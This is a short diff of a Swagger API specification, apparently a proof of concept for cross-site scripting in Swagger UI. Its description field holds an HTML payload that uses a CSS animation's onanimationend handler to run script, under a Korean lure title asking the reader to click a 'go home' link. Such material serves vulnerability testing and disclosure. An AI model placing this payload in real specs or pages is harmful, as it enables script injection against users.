@@ -1,5 +1,5 @@
 {
-  "swagger": "3.0.0",
+  "swagger": "2.0",
   "info": 
   {"title": "아래 [홈으로 이동] 링크를 클릭하세요",
   "description": "</p><style>@keyframes x{}</style><a style='animation-name:x' onanimationend='alert(1)'><h2>홈으로 이동</h2></a>"},
